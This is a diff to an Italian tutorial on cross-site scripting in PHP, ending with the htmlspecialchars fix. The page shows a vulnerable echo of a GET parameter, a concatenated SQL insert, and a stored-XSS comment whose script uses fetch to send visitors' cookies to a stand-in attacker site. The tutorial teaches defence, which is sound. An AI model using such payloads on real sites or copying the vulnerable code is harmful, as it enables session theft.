@@ -13,14 +13,15 @@ Supponiamo di avere una pagina welcome.php scritta in questo modo:
 echo "Benvenuto, " . $_GET['name'];
 ?>
 ```
-Una pagina di questo tipo risponde ad una richiesta del tipo
-`http://tuosito.com/welcome.php?name=Paul`
+Una pagina di questo tipo risponde ad una richiesta del tipo<br/>
+`http://tuosito.com/welcome.php?name=Paul`<br/>
 con una pagina html:
 ```html
 Benvenuto, Paul
 ```
 
 Ma che succede se inviamo un richiesta di questo tipo?
+
 `http://tuosito.com/welcome.php?name=<script>document.cookie</script>`
 
 La pagina restituita diventa:
@@ -29,18 +30,22 @@ Benvenuto, <script>document.cookie</script>
 ```
 forzando il server a generare una pagina di risposta con del codice javascript arbitrario, che viene eseguito nel browser dell'utente che la riceve.
 
-In particolare, document.cookie è un oggetto JavaScript che contiene tutti i cookie accessibili della pagina corrente. Per esempio potrebbe contenere:
+In particolare, in questo caso, document.cookie è un oggetto JavaScript che contiene tutti i cookie accessibili della pagina corrente. Per esempio potrebbe contenere:
+```html
 "sessionId=abc123; userId=456; theme=dark"
+```
 
 #### Esempio di Vulnerabilità XSS
-In realtà questo attacco in particolare non è particolarmente pericoloso, perchè la pagina con il codice "iniettato" viene restituita all'utente che ha effettuato l'attacco. Sarebbe come attaccare se stessi.
-Ma consideriamo questo scenario.
-Supponiamo di avere un Instagram senza protezione verso XSS.
+In realtà l'attacco mostrato nell'esempio non è particolarmente pericoloso, perchè la pagina con il codice "iniettato" viene restituita all'utente che ha effettuato l'attacco. Sarebbe come attaccare se stessi.
+
+Consideriamo però questo scenario.<br/>
+Supponiamo di avere un Instagram senza protezione verso XSS.<br/>
 L'utente CyberCrime commenta il post Instagram dell'utente Tanos con la seguente stringa:
 ```html
-Bel post! <script>fetch('https://cyber-crime.com/upload?' + document.cookie);</script>
+Bel post!
+<script>fetch('https://cyber-crime.com/upload?' + document.cookie);</script>
 ```
-La funzione fetch() esegue una richiesta HTTP GET all'URL passato come parametro.
+La funzione fetch() serve ad eseguire una richiesta HTTP GET all'URL passato come parametro.
 
 Il commento, così come scritto dall'utente CyberCrime, arriva al server, che lo salverà su database, come qualunque altro commento.
 
@@ -51,7 +56,7 @@ $sql = "INSERT INTO comments (text) VALUES ('" . $_POST['comment'] . "')";
 ?>
 ```
 
-Supponiamo che la pagina Instagram di Tanos viene visualizzata dall'utente Tony. Il server prepara dinamicamente la pagina Instagram di Tanos, mostrando tutti commenti del post (caricandoli dal database). Tony quindi riceverà sul suo browser una pagina html del tipo:
+Supponiamo che la pagina Instagram di Tanos viene visualizzata dall'utente Tony. Il server quindi prepara dinamicamente la pagina Instagram di Tanos, mostrando tutti commenti del post (caricandoli dal database). Tony quindi riceverà sul suo browser una pagina html del tipo:
 ```html
 -= Tanos =-
 Il multiverso è una teoria interessante.
@@ -62,7 +67,7 @@ CyberCrime: Bel post!
 ```
 Il browser di Tony eseguirà il codice Javascript, caricando i cookie di Tony sul sito dell'utente CyberCrime.
 
-Come per Tony, CyberCrime riceverà i cookie di tutti gli utenti che accedono alla pagina Instagram di Tanos.
+Come per Tony, CyberCrime collezionerà sul suo sito web i cookie di tutti gli utenti che accedono alla pagina Instagram di Tanos.
 
 Questo esempio mostra come **i cookie non sono adeguati per memorizzare dati sensibili**.
 
@@ -79,7 +84,7 @@ La funzione `htmlspecialchars()` converte i caratteri speciali HTML in entità H
 - `<` diventa `&lt;`
 - `>` diventa `&gt;`
 
-Questo impedisce l'esecuzione di codice JavaScript maligno, perché il browser interpreterà i caratteri speciali come testo da visualizzare e non come codice da eseguire. Nell'esempio precedente, l'output sanificato sarebbe:
+Questo impedisce l'esecuzione di codice JavaScript maligno, perché il browser interpreterà i caratteri speciali come testo da visualizzare e non come codice da eseguire. Nell'esempio precedente, l'output sanificato sarebbe:<br/>
 `Benvenuto, &lt;script&gt;document.cookie&lt;/script&gt;`
 
 I cookie sono particolarmente vulnerabili agli attacchi XSS perché JavaScript può accedere ai cookie della pagina corrente attraverso l'oggetto `document.cookie`.
